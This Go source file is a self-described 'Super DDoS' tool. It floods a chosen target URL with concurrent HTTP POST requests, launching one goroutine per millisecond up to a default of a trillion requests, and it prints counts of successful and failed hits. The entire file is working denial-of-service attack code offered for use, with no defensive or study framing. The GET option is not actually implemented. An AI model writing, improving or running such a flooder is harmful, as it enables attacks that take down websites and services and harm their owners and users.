/**
 Super DDoS Created by ZOXC OFC
**/

package main

import (
	"encoding/json"
	"flag"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net/http"
	"net/url"
	"time"
)

var completeCount = 0
var errorCount = 0

type any interface{}

func main() {
	attackUrl := flag.String("url", "", "attackUrl spam attack")
	method := flag.String("method", "POST", "method for attack (POST/GET)")
	count := flag.Int("count", 1000000000000, "count for attack")
	_data := flag.String("data", ``, "data for attack")
	flag.Parse()

	var data url.Values

	if *attackUrl != "" {

		if *_data != "" {
			_body := getData(*method, *_data)
			data = _body
		}

		rand.Seed(time.Now().UnixNano())
		for i := 0; i < *count; i++ {
			if i%4 == 0 {
				fmt.Println("Strike Hit:", i, "Good:", completeCount, "Bad:", errorCount)
			}
			go startAttack(*attackUrl, *method, data)
			time.Sleep(time.Millisecond)
		}
		fmt.Println("Done.", "Good: ", completeCount, "Error: ", errorCount)
	} else {
		fmt.Println("use -url http://target.com")
	}
}

func startAttack(attackUrl string, method string, data url.Values) bool {
	resp, err := http.PostForm(attackUrl, data)

	if err != nil {
		fmt.Println("Site not available: ", attackUrl, "\nERROR:")
		errorCount++
	} else {
		defer resp.Body.Close()
		body, err := ioutil.ReadAll(resp.Body)

		req := string(body)
		_ = req

		if err != nil || resp.StatusCode != 200 {
			if err != nil {
				log(err)
			} else {
				log(req)
			}
			errorCount++
		} else {
			completeCount++
		}
	}
	return true
}

func log(data any) {
	fmt.Println(data)
}

func getData(method string, data string) url.Values {
	log(method)
	if method == "POST" || method == "post" {
		var body = []byte(data)
		return getFormatPostData(body)
	} else {

		return nil
	}
}

func getFormatPostData(body []byte) url.Values {
	m := map[string]string{}
	if err := json.Unmarshal(body, &m); err != nil {
		panic(err)
	}
	_body := url.Values{}
	for key, val := range m {
		_body.Add(key, val)
	}

	return _body
}

func getFormatGetData() {}
